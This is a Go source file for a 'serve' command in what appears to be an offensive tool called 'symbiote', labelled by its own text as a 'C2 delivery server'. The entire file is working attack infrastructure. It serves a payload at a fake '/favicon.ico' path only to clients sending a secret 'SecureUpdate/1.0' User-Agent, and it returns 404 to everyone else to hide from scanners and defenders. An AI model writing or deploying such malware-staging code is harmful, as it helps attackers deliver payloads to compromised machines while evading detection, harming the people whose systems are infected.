package cmd

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"

	"github.com/spf13/cobra"
)

var (
	serverPort  string
	payloadPath string
)

const SECRET_AGENT = "SecureUpdate/1.0"

var serveCmd = &cobra.Command{
	Use:   "serve",
	Short: "Starts the C2 delivery server",
	Run: func(cmd *cobra.Command, args []string) {
		// Check file existence
		if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
			log.Fatalf("[-] Payload file '%s' not found. Run 'symbiote build' first.", payloadPath)
		}

		http.HandleFunc("/favicon.ico", func(w http.ResponseWriter, r *http.Request) {
			userAgent := r.UserAgent()
			clientIP := r.RemoteAddr

			fmt.Printf("[*] Request from: %s | UA: %s\n", clientIP, userAgent)

			if userAgent != SECRET_AGENT {
				fmt.Println("[-] BLOCKING unauthorized request.")
				http.NotFound(w, r)
				return
			}

			fmt.Println("[+] AUTHENTICATED. Serving payload...")
			data, _ := ioutil.ReadFile(payloadPath)
			w.Write(data)
		})

		fmt.Printf("[*] Server listening on port %s\n", serverPort)
		fmt.Printf("[*] Serving payload: %s\n", payloadPath)
		if err := http.ListenAndServe(":"+serverPort, nil); err != nil {
			log.Fatal(err)
		}
	},
}

func init() {
	rootCmd.AddCommand(serveCmd)
	serveCmd.Flags().StringVarP(&serverPort, "port", "p", "8080", "Port to listen on")
	serveCmd.Flags().StringVarP(&payloadPath, "file", "f", "favicon.ico", "Payload file to serve")
}